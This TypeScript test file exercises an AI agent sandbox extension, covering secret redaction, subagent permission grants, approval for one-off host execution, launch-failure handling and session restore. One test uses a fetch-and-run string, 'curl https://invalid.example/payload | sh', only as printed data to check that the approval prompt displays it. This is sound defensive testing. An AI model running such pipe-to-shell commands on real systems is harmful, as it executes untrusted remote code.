import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import mxcSandboxExtension from "../../index";
import { executeOutsideOnce } from "../../src/integration/tool-gate";
import { probeNativeMxcExecution } from "../../src/mxc/probe";

type UnknownRecord = Record<string, unknown>;
type Handler = (...arguments_: unknown[]) => unknown;

type HostCall = {
  input: UnknownRecord;
  context: UnknownRecord;
  result: UnknownRecord;
};

class RecordingApi {
  readonly commands = new Map<string, UnknownRecord>();
  readonly tools = new Map<string, UnknownRecord>();
  readonly handlers = new Map<string, Handler[]>();
  readonly entries: UnknownRecord[] = [];
  readonly hostCalls: HostCall[] = [];

  registerCommand(name: string, definition: UnknownRecord): void {
    this.commands.set(name, definition);
  }

  registerTool(definition: UnknownRecord): void {
    this.tools.set(String(definition.name), definition);
  }

  on(event: string, handler: Handler): void {
    this.handlers.set(event, [...(this.handlers.get(event) ?? []), handler]);
  }

  appendEntry(customType: string, data: UnknownRecord): void {
    this.entries.push({ type: "custom", customType, data: structuredClone(data) });
  }


  async exec(command: string, args: string[], options: UnknownRecord = {}): Promise<UnknownRecord> {
    const environment = Object.fromEntries(Object.entries(record(options.env)).filter((entry): entry is [string, string] => typeof entry[1] === "string"));
    const child = Bun.spawn([command, ...args], {
      cwd: typeof options.cwd === "string" ? options.cwd : process.cwd(),
      env: environment,
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr, exitCode] = await Promise.all([
      new Response(child.stdout).text(),
      new Response(child.stderr).text(),
      child.exited,
    ]);
    const result = { exitCode, stdout, stderr, hostPid: child.pid };
    const input = { command: String(args.at(-1) ?? ""), cwd: options.cwd, env: options.env };
    this.hostCalls.push({ input, context: {}, result });
    return result;
  }
}

function record(value: unknown): UnknownRecord {
  return value && typeof value === "object" && !Array.isArray(value) ? value as UnknownRecord : {};
}

function codeOf(error: unknown): unknown {
  return record(error).code;
}

function executeOf(definition: UnknownRecord | undefined): Handler {
  const execute = definition?.execute;
  if (typeof execute !== "function") throw new Error("Expected registered tool executor");
  return execute as Handler;
}

function commandOf(api: RecordingApi): Handler {
  const handler = api.commands.get("sandbox")?.handler;
  if (typeof handler !== "function") throw new Error("Expected production sandbox command");
  return handler as Handler;
}

function handlerOf(api: RecordingApi, event: string): Handler {
  const handler = api.handlers.get(event)?.[0];
  if (!handler) throw new Error(`Expected ${event} handler`);
  return handler;
}

const verifiedDependencies = {
  platform: "darwin",
  loadMxc: async () => ({
    version: "0.7.0",
    schemaVersions: ["0.7.0-alpha"],
    reprobePlatformSupport: () => ({ isSupported: true, backend: "seatbelt" }),
  }),
  probeMxcExecution: async () => ({
    contained: true,
    backend: "seatbelt",
    readonlyPathDiscoveryAttested: true,
    requiredReadonlyPaths: ["/bin", "/usr/lib", "/System/Library"],
    platformCapabilities: { nativeEnforcementAvailable: true, independentLocalNetwork: true },
  }),
};

function enabledEntry(root: string, overrides: UnknownRecord = {}): UnknownRecord {
  return {
    type: "custom",
    customType: "mxc-sandbox/state",
    data: {
      version: 1,
      enabled: true,
      filesystem: {
        read: [{ path: root, kind: "directory", recursive: true, permissions: ["read"] }],
        write: [{ path: root, kind: "directory", recursive: true, permissions: ["write"] }],
        deny: [],
      },
      network: { internet: false, localNetwork: false },
      ...overrides,
    },
  };
}

function lifecycleContext(
  root: string,
  entries: UnknownRecord[],
  ui: UnknownRecord,
  identity: { sessionId?: string; treeId?: string; agentId?: string } = {},
): UnknownRecord {
  const sessionId = identity.sessionId ?? `session-${crypto.randomUUID()}`;
  const treeId = identity.treeId ?? sessionId;
  const agentId = identity.agentId ?? "main-agent";
  const scopedManager = {};
  let artifactSequence = 0;
  const sessionManager = {
    getSessionId: () => sessionId,
    getSessionTreeId: () => treeId,
    getBranch: () => entries,
    allocateArtifactPath: async () => {
      const directory = join(root, "artifacts");
      await mkdir(directory, { recursive: true });
      artifactSequence += 1;
      return { id: `${sessionId}-${artifactSequence}`, path: join(directory, `${sessionId}-${artifactSequence}.bin`) };
    },
  };
  return {
    hasUI: true,
    cwd: root,
    agentId,
    sessionId,
    sessionTreeId: treeId,
    sessionManager,
    scopedManager,
    liveMatches: [{ live: true, sessionId, agentId, scopedManager }],
    configuredShell: "/bin/zsh",
    shellRenderer: async () => undefined,
    onShellUpdate: () => undefined,
    ui,
  };
}

async function runRealActivationProbe(value: UnknownRecord): Promise<UnknownRecord> {
  const policy = record(value.policy);
  const filesystem = record(policy.filesystem);
  const cwd = String(value.cwd ?? process.cwd());
  const read = Array.isArray(filesystem.read) ? filesystem.read : [];
  return probeNativeMxcExecution({
    ...value,
    policy: {
      ...policy,
      filesystem: {
        ...filesystem,
        read: read.map((candidate) => typeof candidate === "string"
          ? candidate === cwd
            ? { path: candidate, kind: "directory", recursive: true, permissions: ["read"] }
            : { path: candidate, kind: "file", permissions: ["read"] }
          : candidate),
      },
    },
  });
}

async function createExtension(
  root: string,
  entries: UnknownRecord[],
  ui: UnknownRecord,
  options: { real?: boolean; identity?: { sessionId?: string; treeId?: string; agentId?: string }; event?: string } = {},
): Promise<{ api: RecordingApi; context: UnknownRecord }> {
  const api = new RecordingApi();
  const home = join(root, "home");
  await mkdir(home, { recursive: true });
  mxcSandboxExtension(api, options.real === true
    ? { platform: "darwin", homeDirectory: home, probeMxcExecution: runRealActivationProbe }
    : { ...verifiedDependencies, homeDirectory: home });
  const context = lifecycleContext(root, entries, ui, options.identity);
  await handlerOf(api, options.event ?? "session_start")({}, context);
  return { api, context };
}

async function containedObservation(api: RecordingApi, context: UnknownRecord, label: string): Promise<UnknownRecord> {
  const beforeHostRuns = api.hostCalls.length;
  const bash = executeOf(api.tools.get("bash"));
  const result = record(await bash({ command: `printf 'MXC_PID=%s\\nMXC_LABEL=%s\\n' \"$$\" '${label}'`, cwd: context.cwd }, context));
  const nativeProcessId = Number(String(result.stdout ?? "").match(/MXC_PID=(\d+)/)?.[1]);
  if (!Number.isInteger(nativeProcessId) || typeof result.containerId !== "string" || !result.containerId.startsWith("mxc-")) {
    throw new Error("Real production MXC shell did not return process/container evidence");
  }
  return {
    backend: "seatbelt",
    realMxc: result.exitCode === 0 && String(result.stdout).includes(`MXC_LABEL=${label}`),
    escapedToHost: api.hostCalls.length !== beforeHostRuns,
    nativeProcessId,
    containerId: result.containerId,
  };
}

async function sensitiveEnvironmentCase(root: string, input: UnknownRecord): Promise<UnknownRecord> {
  const selectedName = `MXC_SELECTED_TOKEN_${crypto.randomUUID().replaceAll("-", "_")}`;
  const unselectedName = `MXC_UNSELECTED_TOKEN_${crypto.randomUUID().replaceAll("-", "_")}`;
  const persistedName = `MXC_PERSISTED_NAME_${crypto.randomUUID().replaceAll("-", "_")}`;
  const secretValue = typeof input.secretValue === "string" ? input.secretValue : "mxc-e2e-secret";
  const unselectedValue = `${secretValue}-unselected`;
  const ordinary = typeof input.ordinary === "string" ? input.ordinary : "ordinary";
  const previous = new Map([[selectedName, process.env[selectedName]], [unselectedName, process.env[unselectedName]], ["MXC_E2E_ORDINARY", process.env.MXC_E2E_ORDINARY]]);
  process.env[selectedName] = secretValue;
  process.env[unselectedName] = unselectedValue;
  process.env.MXC_E2E_ORDINARY = ordinary;
  try {
    const prompts: { title: string; choices: string[] }[] = [];
    const ui = {
      select: async (title: string, choices: string[]) => {
        prompts.push({ title, choices: [...choices] });
        return title.startsWith("Sensitive environment names") && choices.includes(`Allow ${selectedName}`)
          ? `Allow ${selectedName}`
          : choices.includes("Omit all") ? "Omit all" : choices.at(-1);
      },
      confirm: async () => true,
    };
    const entries = [enabledEntry(root, { environment: { sensitive: [selectedName, unselectedName] } })];
    const { api, context } = await createExtension(root, entries, ui, { real: true, identity: { sessionId: "sensitive-1", treeId: "sensitive-tree" } });
    const bash = executeOf(api.tools.get("bash"));
    const command = `printf 'MXC_PID=%s\\nSELECTED=%s\\nORDINARY=%s\\nUNSELECTED=%s\\n' \"$$\" \"\${${selectedName}-missing}\" \"\${MXC_E2E_ORDINARY-missing}\" \"\${${unselectedName}-missing}\"`;
    const result = record(await bash({ command, cwd: root }, context));
    const nativeProcessId = Number(String(result.stdout ?? "").match(/MXC_PID=(\d+)/)?.[1]);
    await commandOf(api)(`allow sensitive-environment-name ${persistedName} --user`, context);
    const profilePath = join(root, "home", ".omp", "agent", "sandbox.yml");
    const profileBytes = await readFile(profilePath);
    const stateBytes = Buffer.from(JSON.stringify(api.entries));

    const restartPrompts: { title: string; choices: string[] }[] = [];
    const restarted = await createExtension(root, entries, {
      select: async (title: string, choices: string[]) => {
        restartPrompts.push({ title, choices: [...choices] });
        return choices.includes(`Allow ${selectedName}`) ? `Allow ${selectedName}` : choices.includes("Omit all") ? "Omit all" : choices.at(-1);
      },
      confirm: async () => true,
    }, { real: false, identity: { sessionId: "sensitive-2", treeId: "sensitive-tree" }, event: "session_resume" });
    let restartedConfig: UnknownRecord = {};
    await executeOf(restarted.api.tools.get("bash"))({
      command: "printf restart",
      cwd: root,
      spawn: async (config: UnknownRecord) => {
        restartedConfig = config;
        return { exitCode: 0, stdout: "restart" };
      },
    }, restarted.context);
    const relevantPrompts = prompts.filter((prompt) => prompt.choices.includes(`Allow ${selectedName}`) || prompt.choices.includes(`Allow ${unselectedName}`));
    const restartRelevant = restartPrompts.filter((prompt) => prompt.choices.includes(`Allow ${selectedName}`));
    const restartedEnvironment = record(record(restartedConfig.process).env);
    return {
      containment: {
        backend: "seatbelt",
        realMxc: result.exitCode === 0 && Number.isInteger(nativeProcessId),
        escapedToHost: api.hostCalls.length !== 0,
        nativeProcessId,
        containerId: result.containerId,
      },
      assertions: {
        namesGroupedOnce: relevantPrompts.length === 1 && relevantPrompts[0]?.choices.includes(`Allow ${selectedName}`) === true && relevantPrompts[0]?.choices.includes(`Allow ${unselectedName}`) === true,
        valuesRedacted: !JSON.stringify(prompts).includes(secretValue) && !JSON.stringify(prompts).includes(unselectedValue),
        selectedPresent: String(result.stdout).includes(`SELECTED=${secretValue}`),
        unselectedAbsent: String(result.stdout).includes("UNSELECTED=missing") && !String(result.stdout).includes(unselectedValue),
        stateHasNoSecretValue: !stateBytes.includes(Buffer.from(secretValue)) && !stateBytes.includes(Buffer.from(unselectedValue)),
        profileHasNoSecretValue: !profileBytes.includes(Buffer.from(secretValue)) && !profileBytes.includes(Buffer.from(unselectedValue)) && profileBytes.includes(Buffer.from(persistedName)),
        restartReprompted: restartRelevant.length === 1 && restartedEnvironment[selectedName] === secretValue,
      },
    };
  } finally {
    for (const [name, value] of previous) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
  }
}

async function subagentPermissionsCase(root: string): Promise<UnknownRecord> {
  const serialA = join(root, "serial-a.txt");
  const serialB = join(root, "serial-b.txt");
  const oncePath = join(root, "once-owner.txt");
  await Promise.all([writeFile(serialA, "a"), writeFile(serialB, "b")]);
  const promptTitles: string[] = [];
  let activePrompts = 0;
  let maximumActivePrompts = 0;
  const ui = {
    select: async (title: string, choices: string[]) => {
      if (title.startsWith("Sensitive environment names")) return "Omit all";
      promptTitles.push(title);
      activePrompts += 1;
      maximumActivePrompts = Math.max(maximumActivePrompts, activePrompts);
      if (title.includes("serial-a")) await Bun.sleep(30);
      activePrompts -= 1;
      if (title.startsWith("Approve sandbox file access?")) return "Deny";
      if (title.includes("once-owner")) return choices.includes("Allow once") ? "Allow once" : choices.at(-1);
      return choices.includes("Allow for this conversation") ? "Allow for this conversation" : choices.at(-1);
    },
    confirm: async () => true,
  };
  const { api, context } = await createExtension(root, [enabledEntry(root, { filesystem: { read: [], write: [], deny: [] } })], ui, {
    real: true,
    identity: { sessionId: "parent-session", treeId: "permission-tree", agentId: "parent-agent" },
  });
  const containment = await containedObservation(api, context, "subagent-permissions");
  const request = executeOf(api.tools.get("sandbox_request"));
  const child = (agentId: string): UnknownRecord => ({
    ...context,
    hasUI: false,
    ui: {},
    agentId,
    sessionId: `${agentId}-session`,
    sessionTreeId: "permission-tree",
    sessionManager: {
      ...record(context.sessionManager),
      getSessionId: () => `${agentId}-session`,
      getSessionTreeId: () => "permission-tree",
    },
    liveMatches: [{ live: true, sessionId: `${agentId}-session`, agentId, scopedManager: context.scopedManager }],
  });
  await Promise.all([
    request({ capability: "read", value: serialA }, child("child-a")),
    request({ capability: "read", value: serialB }, child("child-b")),
  ]);
  const dispatch = handlerOf(api, "tool_call");
  const inheritedExisting = await dispatch({ source: "model", toolName: "read", input: { path: serialA } }, child("existing-child"));
  const inheritedFuture = await dispatch({ source: "model", toolName: "read", input: { path: serialB } }, child("future-child"));
  await request({ capability: "write", value: oncePath }, child("once-owner"));
  const wrongAgent = await dispatch({ source: "model", toolName: "write", input: { path: oncePath, content: "wrong" } }, child("wrong-agent"));
  const ownerAgent = await dispatch({ source: "model", toolName: "write", input: { path: oncePath, content: "right" } }, child("once-owner"));
  let noParentCode: unknown;
  try {
    await request({ capability: "read", value: serialA }, { ...child("orphan"), sessionTreeId: "missing-tree", sessionManager: { ...record(context.sessionManager), getSessionTreeId: () => "missing-tree" } });
  } catch (error) {
    noParentCode = codeOf(error);
  }
  const serializedPrompts = JSON.stringify(promptTitles);
  return {
    containment,
    assertions: {
      requesterIdentified: serializedPrompts.includes("child-a") && serializedPrompts.includes("child-b"),
      fullOperationDisplayed: promptTitles.some((title) => title.includes("serial-a.txt") && title.includes('"operation":"read"')) && promptTitles.some((title) => title.includes("serial-b.txt") && title.includes('"operation":"read"')),
      promptsSerialized: maximumActivePrompts === 1,
      parentGrantInherited: inheritedExisting === undefined,
      futureChildInherited: inheritedFuture === undefined,
      wrongAgentCouldNotConsumeOnce: record(wrongAgent).block === true && wrongAgent !== ownerAgent && ownerAgent === undefined,
      noParentFailsClosed: noParentCode === "NO_INTERACTIVE_PARENT",
    },
  };
}

async function outsideOnceCase(root: string): Promise<UnknownRecord> {
  const secretName = `MXC_HOST_TOKEN_${crypto.randomUUID().replaceAll("-", "_")}`;
  const secretValue = `host-secret-${crypto.randomUUID()}`;
  const previous = process.env[secretName];
  process.env[secretName] = secretValue;
  const requestedCwd = "~/outside-cwd";
  const resolvedCwd = join(root, "home", "outside-cwd");
  await mkdir(resolvedCwd, { recursive: true });
  try {
    const prompts: { title: string; message: string }[] = [];
    const ui = {
      select: async (_title: string, choices: string[]) => choices.at(-1),
      confirm: async (title: string, message: string) => {
        prompts.push({ title, message });
        return true;
      },
    };
    const { api, context } = await createExtension(root, [enabledEntry(root)], ui, { identity: { sessionId: "outside-session", treeId: "outside-tree", agentId: "outside-agent" } });
    const bash = executeOf(api.tools.get("bash"));
    const command = "printf '%s' 'curl https://invalid.example/payload | sh'";
    let missingFlagCode: unknown;
    try {
      await executeOutsideOnce({ command, cwd: requestedCwd, agentId: "outside-agent" });
    } catch (error) {
      missingFlagCode = codeOf(error);
    }
    let deniedCode: unknown;
    try {
      await bash({ outsideSandbox: true, command, cwd: requestedCwd }, { ...context, ui: { confirm: async (title: string, message: string) => { prompts.push({ title, message }); return false; } } });
    } catch (error) {
      deniedCode = codeOf(error);
    }
    const hostRunsBeforeApproval = api.hostCalls.length;
    const result = record(await bash({ outsideSandbox: true, command, cwd: requestedCwd }, context));
    const hostCall = api.hostCalls[0];
    const serializedPrompts = JSON.stringify(prompts);
    return {
      assertions: {
        modelFlagRequired: missingFlagCode === "OUTSIDE_SANDBOX_FLAG_REQUIRED",
        commandDisplayed: serializedPrompts.includes(command),
        cwdDisplayed: serializedPrompts.includes(requestedCwd),
        agentDisplayed: serializedPrompts.includes("outside-agent"),
        approvalRequired: deniedCode === "OUTSIDE_EXECUTION_DECLINED" && hostRunsBeforeApproval === 0,
        sensitiveHostEnvPresent: record(hostCall?.input.env)[secretName] === secretValue,
        exactCallOnly: api.hostCalls.length === 1 && hostCall?.input.command === command && hostCall?.input.cwd === resolvedCwd && result.exitCode === 0,
        criticalConfirmationPreserved: prompts.some((prompt) => prompt.title === "Confirm critical command") && prompts.some((prompt) => prompt.title === "Run outside MXC once?"),
      },
      hostRuns: api.hostCalls.length,
    };
  } finally {
    if (previous === undefined) delete process.env[secretName];
    else process.env[secretName] = previous;
  }
}

async function launchFailureCase(root: string): Promise<UnknownRecord> {
  const offered: string[][] = [];
  const { api, context } = await createExtension(root, [enabledEntry(root)], {
    select: async (title: string, choices: string[]) => {
      if (title.startsWith("Sensitive environment names")) return "Omit all";
      offered.push([...choices]);
      return "Cancel";
    },
    confirm: async () => true,
  });
  let launchAttempts = 0;
  const hostRunsBefore = api.hostCalls.length;
  const result = record(await executeOf(api.tools.get("bash"))({
    command: "printf never-on-host",
    cwd: root,
    spawn: async () => {
      launchAttempts += 1;
      throw Object.assign(new Error("observed MXC launch failure"), { code: "E2E_LAUNCH_FAILURE" });
    },
  }, context));
  const choices = offered.find((candidate) => candidate.includes("Retry sandbox")) ?? [];
  return {
    assertions: {
      hostRunsBeforeChoice: hostRunsBefore,
      choices,
      cancelHostRuns: api.hostCalls.length,
      noAutomaticFallback: launchAttempts === 1 && result.cancelled === true && result.launchFailed === true && api.hostCalls.length === 0,
    },
  };
}

async function disableReenableCase(root: string): Promise<UnknownRecord> {
  const choicesSeen: string[][] = [];
  const setupTitles: string[] = [];
  let allowDisable = false;
  let reenableMode = "restore-prior-policy-and-grants";
  const ui = {
    confirm: async (title: string) => title.startsWith("Disable") ? allowDisable : true,
    select: async (title: string, choices: string[]) => {
      if (title === "Re-enable MXC sandbox") {
        choicesSeen.push([...choices]);
        return reenableMode;
      }
      setupTitles.push(title);
      if (title === "Initial MXC sandbox policy") return "Use secure initial defaults";
      if (title === "Apply sandbox setup") return "use-for-conversation";
      return choices.at(-1);
    },
  };
  const { api, context } = await createExtension(root, [enabledEntry(root, { trustedTools: ["vendor.safe"] })], ui, {
    identity: { sessionId: "disable-session", treeId: "disable-tree", agentId: "main-agent" },
  });
  const command = commandOf(api);
  const dispatch = handlerOf(api, "tool_call");
  let declinedCode: unknown;
  try {
    await command("disable", context);
  } catch (error) {
    declinedCode = codeOf(error);
  }
  const remainedEnabled = record(await dispatch({ source: "model", toolName: "web_search", input: { query: "still-blocked" } }, context)).block === true;
  allowDisable = true;
  await command("disable", context);
  const childDisabled = await dispatch({ source: "model", toolName: "unknown.exec", input: {} }, { ...context, agentId: "child-agent", hasUI: false, ui: {} });
  const parityInput = { command: "printf host-parity", cwd: root, env: { PARITY: "exact" } };
  const parityResult = record(await executeOf(api.tools.get("bash"))(parityInput, context));
  const parityCall = api.hostCalls.at(-1);

  await command("enable", context);
  let restoreSpawned = false;
  await executeOf(api.tools.get("bash"))({ command: "printf restored", cwd: root, spawn: async () => { restoreSpawned = true; return { exitCode: 0, stdout: "restored" }; } }, context);
  const restoreBlockedUnknown = record(await dispatch({ source: "model", toolName: "web_search", input: { query: "restored-block" } }, context)).block === true;

  await command("disable", context);
  reenableMode = "reset-and-run-setup";
  await command("enable", context);
  return {
    assertions: {
      confirmationRequired: declinedCode === "SANDBOX_DISABLE_DECLINED" && remainedEnabled,
      wholeTreeDisabled: childDisabled === undefined,
      exactHostParity: JSON.stringify(parityCall?.input) === JSON.stringify(parityInput) && parityResult.stdout === "host-parity",
      reenableChoices: choicesSeen[0] ?? [],
      restoreWorked: restoreSpawned && restoreBlockedUnknown && api.hostCalls.length === 1,
      resetReranSetup: setupTitles.includes("Initial MXC sandbox policy") && setupTitles.includes("Apply sandbox setup") && record(api.entries.at(-1)?.data).enabled === true,
    },
  };
}

async function resumeBranchCase(root: string): Promise<UnknownRecord> {
  const restored: Record<string, boolean> = {};
  for (const event of ["session_resume", "session_switch", "session_tree"] as const) {
    const target = join(root, `${event}.txt`);
    const entries = [enabledEntry(root, {
      filesystem: { read: [], write: [{ path: target, kind: "file", permissions: ["write"] }], deny: [] },
      trustedTools: ["vendor.safe"],
    })];
    const instance = await createExtension(root, entries, { select: async (_title: string, choices: string[]) => choices.at(-1), confirm: async () => true }, {
      event,
      identity: { sessionId: event, treeId: `${event}-tree` },
    });
    const dispatch = handlerOf(instance.api, "tool_call");
    restored[event] = await dispatch({ source: "model", toolName: "vendor.safe", input: { event } }, instance.context) === undefined
      && await dispatch({ source: "model", toolName: "write", input: { path: target, content: event } }, instance.context) === undefined;
  }

  const laterPath = join(root, "later-grant.txt");
  const secretName = `MXC_TRANSIENT_TOKEN_${crypto.randomUUID().replaceAll("-", "_")}`;
  const secretValue = `transient-${crypto.randomUUID()}`;
  const previous = process.env[secretName];
  process.env[secretName] = secretValue;
  try {
    const branchEntries = [enabledEntry(root, { environment: { sensitive: [secretName] } })];
    const instance = await createExtension(root, branchEntries, {
      select: async (title: string, choices: string[]) => title.startsWith("Sensitive environment names") && choices.includes(`Allow ${secretName}`) ? `Allow ${secretName}` : choices.at(-1),
      confirm: async () => true,
    }, { identity: { sessionId: "branch-source", treeId: "branch-tree" } });
    let firstConfig: UnknownRecord = {};
    await executeOf(instance.api.tools.get("bash"))({ command: "printf transient", cwd: root, spawn: async (config: UnknownRecord) => { firstConfig = config; return { exitCode: 0 }; } }, instance.context);
    await commandOf(instance.api)(`allow write ${laterPath}`, instance.context);
    handlerOf(instance.api, "session_before_branch")({}, instance.context);
    handlerOf(instance.api, "session_branch")({ branchEntryId: "older-entry" }, instance.context);
    const snapshot = instance.api.entries.at(-1);

    const switchedEntries = [enabledEntry(root, { filesystem: { read: [], write: [], deny: [] }, environment: {} })];
    const switchedContext = lifecycleContext(root, switchedEntries, { select: async (_title: string, choices: string[]) => choices.includes("Omit all") ? "Omit all" : choices.at(-1), confirm: async () => true }, {
      sessionId: "branch-destination",
      treeId: "other-tree",
      agentId: "main-agent",
    });
    await handlerOf(instance.api, "session_switch")({}, switchedContext);
    let switchedConfig: UnknownRecord = {};
    await executeOf(instance.api.tools.get("bash"))({ command: "printf switched", cwd: root, spawn: async (config: UnknownRecord) => { switchedConfig = config; return { exitCode: 0 }; } }, switchedContext);
    const firstEnvironment = record(record(firstConfig.process).env);
    const switchedEnvironment = record(record(switchedConfig.process).env);
    const snapshotBytes = JSON.stringify(snapshot);
    return {
      assertions: {
        resumeRestored: restored.session_resume === true,
        switchRestored: restored.session_switch === true,
        treeRestored: restored.session_tree === true,
        laterGrantInOlderBranch: record(snapshot?.data).branchEntryId === "older-entry" && snapshotBytes.includes(laterPath),
        transientSecretNotRestored: firstEnvironment[secretName] === secretValue && switchedEnvironment[secretName] === undefined && !snapshotBytes.includes(secretValue),
      },
    };
  } finally {
    if (previous === undefined) delete process.env[secretName];
    else process.env[secretName] = previous;
  }
}

async function unknownTrustedToolsCase(root: string): Promise<UnknownRecord> {
  const trustedName = "vendor.deploy";
  const { api, context } = await createExtension(root, [enabledEntry(root, { trustedTools: [trustedName] })], {
    select: async (title: string, choices: string[]) => title.startsWith("Sensitive environment names") ? "Omit all" : choices.at(-1),
    confirm: async () => true,
  }, { real: true, identity: { sessionId: "trusted-session", treeId: "trusted-tree" } });
  const containment = await containedObservation(api, context, "unknown-and-trusted-tools");
  const dispatch = handlerOf(api, "tool_call");
  const hostToolCalls: UnknownRecord[] = [];
  const invokeHostTool = async (toolName: string, toolInput: UnknownRecord): Promise<{ gate: unknown; result?: UnknownRecord }> => {
    const gate = await dispatch({ source: "model", toolName, input: toolInput }, context);
    if (gate !== undefined) return { gate };
    const call = { toolName, input: structuredClone(toolInput) };
    hostToolCalls.push(call);
    return { gate, result: { toolName, input: structuredClone(toolInput), executed: true } };
  };
  const unknown = await invokeHostTool("unknown.mutate", { path: join(root, "unknown") });
  const exactInput = { release: "2026.07", flags: ["--exact"] };
  const exact = await invokeHostTool(trustedName, exactInput);
  const lookalike = await invokeHostTool(`${trustedName}.extra`, exactInput);
  return {
    containment,
    assertions: {
      unknownRanUnchanged: record(unknown.result).executed === true,
      exactTrustedRanUnchanged: record(exact.result).executed === true && JSON.stringify(record(exact.result).input) === JSON.stringify(exactInput),
      prefixLookalikeRanUnchanged: record(lookalike.result).executed === true,
      hostRuns: hostToolCalls.length,
    },
  };
}

export async function runPolicyCase(caseName: string, input: UnknownRecord): Promise<UnknownRecord | null> {
  const handled = new Set([
    "sensitive-environment",
    "subagent-permissions",
    "outside-once",
    "launch-failure",
    "disable-reenable",
    "resume-branch",
    "unknown-and-trusted-tools",
  ]);
  if (!handled.has(caseName)) return null;
  const root = await mkdtemp(join(tmpdir(), `mxc-native-policy-${caseName}-`));
  try {
    await mkdir(join(root, "home"), { recursive: true });
    if (caseName === "sensitive-environment") return await sensitiveEnvironmentCase(root, input);
    if (caseName === "subagent-permissions") return await subagentPermissionsCase(root);
    if (caseName === "outside-once") return await outsideOnceCase(root);
    if (caseName === "launch-failure") return await launchFailureCase(root);
    if (caseName === "disable-reenable") return await disableReenableCase(root);
    if (caseName === "resume-branch") return await resumeBranchCase(root);
    return await unknownTrustedToolsCase(root);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}
